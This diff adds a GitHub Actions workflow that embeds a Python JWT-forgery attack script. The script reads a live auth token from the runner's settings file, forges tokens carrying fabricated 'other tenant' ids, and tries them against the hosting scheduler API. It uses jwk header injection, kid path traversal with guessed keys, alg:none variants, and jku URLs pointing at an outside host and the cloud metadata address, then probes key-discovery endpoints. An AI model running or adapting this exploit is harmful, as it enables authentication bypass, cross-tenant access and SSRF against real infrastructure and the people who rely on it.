@@ -1,0 +1,120 @@
+name: probe_v71_jwtforge
+on:
+  workflow_dispatch:
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: jwt-forgery-sweep
+        continue-on-error: true
+        run: |
+          python3 -m pip install --quiet cryptography 2>/dev/null || pip3 install --quiet cryptography
+          python3 - <<'PYEOF'
+          import json, base64, hmac, hashlib, urllib.request, urllib.error, os, uuid
+          from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
+          from cryptography.hazmat.primitives import serialization
+
+          s = json.load(open('/opt/hca/.settings'))
+          tok   = s['authToken']
+          sched = s['schedulerApiUrl']                 # .../v1
+          trace = s.get('traceApiUrl','')
+          wtr   = s.get('watchdogTraceApiUrl','')
+          host  = sched.rsplit('/v1',1)[0]
+
+          def b64u(b):
+              if isinstance(b,str): b=b.encode()
+              return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+          def b64ud(x):
+              x+='='*(-len(x)%4); return base64.urlsafe_b64decode(x)
+
+          h_raw,c_raw,sig = tok.split('.')
+          hdr = json.loads(b64ud(h_raw)); claims = json.loads(b64ud(c_raw))
+          print('REAL_HDR='+json.dumps(hdr))
+          print('REAL_CLAIMS_KEYS='+str(sorted(claims.keys())))
+          real_wid = claims.get('wid',''); print('REAL_WID='+real_wid)
+          kid = hdr.get('kid',''); print('REAL_KID='+kid)
+          print('ALG='+str(hdr.get('alg')))
+
+          # forged wid: keep real pool_guid, randomize alloc+job (a plausible "other tenant" id)
+          parts = real_wid.split(':')
+          if len(parts)==3:
+              forged_wid = parts[0]+':'+str(uuid.uuid4())+':'+str(uuid.uuid4())
+          else:
+              forged_wid = str(uuid.uuid4())+':'+str(uuid.uuid4())+':'+str(uuid.uuid4())
+          # also a fully fabricated wid (different pool)
+          fab_wid = str(uuid.uuid4())+':'+str(uuid.uuid4())+':'+str(uuid.uuid4())
+          print('FORGED_WID='+forged_wid)
+          print('FAB_WID='+fab_wid)
+
+          def oracle(label, token):
+              # GET /v1/request is read-only: 401=auth-rejected(secure), 409/200/404=auth-accepted(FORGERY!)
+              url = sched + '/request'
+              r = urllib.request.Request(url, method='GET')
+              r.add_header('Authorization','Bearer '+token)
+              try:
+                  resp=urllib.request.urlopen(r,timeout=15)
+                  st=resp.status; body=resp.read(200).decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  st=e.code; body=e.read(200).decode('utf-8','replace')
+              except Exception as e:
+                  st='ERR'; body=str(e)
+              verdict='**FORGERY-ACCEPTED**' if st not in (401,'ERR') else ('refute(401)' if st==401 else 'err')
+              print('ORACLE[%s] -> %s %s | %s' % (label, st, verdict, body[:120].replace(chr(10),' ')))
+              return st
+
+          # ---- baseline: real token (expect 409 per D4) ----
+          oracle('BASELINE_real_token', tok)
+
+          # ===== V1: jwk embedded-key header injection =====
+          priv = Ed25519PrivateKey.generate()
+          pub  = priv.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)
+          our_jwk = {'kty':'OKP','crv':'Ed25519','x':b64u(pub)}
+          for wlabel,w in [('forged',forged_wid),('fab',fab_wid)]:
+              fh = {'alg':'EdDSA','typ':'JWT','jwk':our_jwk}
+              fc = dict(claims); fc['wid']=w
+              signing = b64u(json.dumps(fh,separators=(',',':')))+'.'+b64u(json.dumps(fc,separators=(',',':')))
+              s_ = priv.sign(signing.encode())
+              t_ = signing+'.'+b64u(s_)
+              oracle('V1_jwk_'+wlabel, t_)
+
+          # ===== V3: kid -> null-file HS256 (empty/known key) =====
+          for kidval in ['../../../../../../../../dev/null','../../../../../../../../proc/sys/kernel/ostype','']:
+              for keyguess in [b'', b'\x00', b'null']:
+                  fh = {'alg':'HS256','typ':'JWT','kid':kidval}
+                  fc = dict(claims); fc['wid']=forged_wid
+                  signing = b64u(json.dumps(fh,separators=(',',':')))+'.'+b64u(json.dumps(fc,separators=(',',':')))
+                  s_ = hmac.new(keyguess, signing.encode(), hashlib.sha256).digest()
+                  t_ = signing+'.'+b64u(s_)
+                  oracle('V3_kid[%s]_key[%r]' % (kidval[-12:],keyguess), t_)
+
+          # ===== V4: alg:none variants =====
+          for a in ['none','None','NONE','nOnE']:
+              fh = {'alg':a,'typ':'JWT'}; fc=dict(claims); fc['wid']=forged_wid
+              t_ = b64u(json.dumps(fh,separators=(',',':')))+'.'+b64u(json.dumps(fc,separators=(',',':')))+'.'
+              oracle('V4_'+a, t_)
+
+          # ===== V2 (forgery-signal only; SSRF needs OOB listener round 2) =====
+          for jku in ['https://ssrf-test.dfkhelper.com/.well-known/jwks.json','http://169.254.169.254/metadata/instance']:
+              fh={'alg':'EdDSA','typ':'JWT','kid':kid,'jku':jku}; fc=dict(claims); fc['wid']=forged_wid
+              signing=b64u(json.dumps(fh,separators=(',',':')))+'.'+b64u(json.dumps(fc,separators=(',',':')))
+              s_=priv.sign(signing.encode()); t_=signing+'.'+b64u(s_)
+              oracle('V2_jku['+jku.split('/')[2]+']', t_)
+
+          # ===== V6: keyserver / discovery endpoint recon =====
+          print('=== V6 DISCOVERY ===')
+          bases=set()
+          for u in [sched,trace,wtr]:
+              if u:
+                  b=u.split('//')[0]+'//'+u.split('//')[1].split('/')[0]; bases.add(b)
+          for b in sorted(bases):
+              for p in ['/.well-known/openid-configuration','/.well-known/jwks.json','/jwks','/jwks.json','/keys','/v1/keys','/.well-known/jwks']:
+                  try:
+                      rr=urllib.request.urlopen(b+p,timeout=10)
+                      bd=rr.read(400).decode('utf-8','replace')
+                      print('DISC %s%s -> %s len=%d %s' % (b,p,rr.status,len(bd),bd[:200].replace(chr(10),' ')))
+                  except urllib.error.HTTPError as e:
+                      print('DISC %s%s -> %s' % (b,p,e.code))
+                  except Exception as e:
+                      print('DISC %s%s -> ERR %s' % (b,p,str(e)[:60]))
+          print('=== DONE ===')
+          PYEOF
